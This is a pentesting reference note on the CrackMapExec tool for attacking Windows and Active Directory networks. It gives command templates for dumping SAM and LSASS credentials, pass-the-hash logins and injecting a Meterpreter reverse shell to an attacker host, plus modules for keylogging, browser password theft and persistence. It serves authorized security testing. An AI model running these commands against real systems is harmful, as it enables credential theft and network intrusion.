# CrackMapExec

`CrackMapExec` is a "Swiss army knife for pentesting Windows / Active Directory
environments" that wraps around multiples `Impacket` modules.

`CrackMapExec` can be used to test credentials and execute commands through
`SMB`, `WinRM`, `MSSQL`, `SSH`, `HTTP` services.

Over `SMB`, `CrackMapExec` supports different command execution methods:
  - (Default) `wmiexec` executes commands via `WMI`
  - `smbexec` executes commands by creating and running a service, similarly to
  the `PsExec` utility
  - `atexec` executes commands by remotely scheduling a task with through the
  Windows task scheduler
  - `mmcexec` executes commands over the `MMC20.Application` `DCOM` object

`CrackMapExec` additionally supports authentication with `Kerberos` tickets
(specified in the `KRB5CCNAME` environment variable) on Linux operating
systems.

### CrackMapExec installation

`CrackMapExec` requires various Python dependencies (sometimes in specific
version), making its installation somewhat challenging at times.

`CrackMapExec` pre-compiled binaries for Linux and Windows (that still require
`Python3` to be installed on the system) can be downloaded on the
[CrackMapExec's GitHub repository's
"Actions"](https://github.com/byt3bl33d3r/CrackMapExec/actions). Fully
standalone binaries for Linux and Windows can be retrieved in the
[OffensivePythonPipeline](https://github.com/Qazeer/OffensivePythonPipeline).

For more information on `CrackMapExec`'s installation refer to the [official
documentation](https://mpgn.gitbook.io/crackmapexec/getting-started/installation).

```bash
# As of March 2021, the crackmapexec package of the Kali Linux distribution is up to date and can be used to easily install CrackMapExec.
apt install crackmapexec

# Installation using Docker.
docker pull byt3bl33d3r/crackmapexec
docker run byt3bl33d3r/crackmapexec:latest [...]
```

### CrackMapExec usage

```bash
# As of December 2018, crackmapexec does not provides an option to output to a file.
# The tee utility can be used to both display and store to a file the crackmapexec standard output.
# crackmapexec <[...]> | tee <OUTPUT_FILE>

# <TARGET | TARGETS> - can be IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of targets.
crackmapexec <smb | winrm | ssh | mssql | http> <TARGET | TARGETS> [-M <MODULE> [-o <MODULE_OPTION>]] (-d <DOMAIN> | --local-auth) -u <USERNAME | USERNAMES_FILE> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>) [--sam] [-x <COMMAND> | -X <PS_COMMAND>]

# Kerberos authentication on Linux systems. The targets must be fully qualified hostnames (and not IP addresses) for the Kerberos authentication to work.
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
crackmapexec smb <TARGET | TARGETS> --kerberos [...]
```

Additionally, `CrackMapExec` includes multiples modules that can be used for
post-exploitation:

```
crackmapexec smb --list-modules

[*] Get-ComputerDetails       Enumerates sysinfo
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers' machine
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] netripper                 Capture's credentials by using API hooking
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] rdp                       Enables/Disables RDP
[*] rid_hijack                Executes the RID hijacking persistence hook.
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] wireless                  Get key of all wireless interfaces
```

### CrackMapExec modules

`CrackMapExec` notable modules usage:

```
# SAM dump.
crackmapexec smb <TARGET | TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump using lsassy.
crackmapexec smb <TARGET | TARGETS> -M lsassy (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
# Outdated LSASS dump technique using mimikatz that is flagged by most antivirus products.
crackmapexec smb <TARGET | TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# Meterpreter.
# msf > use multi/handler
# msf exploit(handler) > set payload windows/meterpreter/reverse_https
crackmapexec smb <TARGET | TARGETS> -M met_inject -o LHOST=<HOST> LPORT=<PORT> -d <DOMAIN> -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

For more information on how to remotely extract credentials from the `SAM`
registry hive and the `LSASS` process, refer to the `[Windows] Post
exploitation` note.

Note that:
  - The `--lsa` option dumps LSA secrets which can't be used in `Pass-the-Hash`
    attack and are harder to crack.
  - The `<TARGET>` and `<MODULE>` should be specified before the credentials as
    a `CrackMapExec` bug could skip the targets / module otherwise.
  - If the targeted host is unreachable, `CrackMapExec` may exit with out
    returning any error message.
  - In case the metinject fails, a local administrator can be added for RDP
    access or a powershell reverse shell injected in memory instead (refer to
    the `[General] Shells - PowerShell` note).
  - If a `permission denied` error is raised upon first execution of
    `crackmapexec` on a Linux system, necessary rights to create new files in
    the user's `HOME` folder may be missing. A temporary alternative `HOME`
    folder can be specified for `crackmapexec` execution: `HOME=<PATH>
    crackmapexec [...]`.
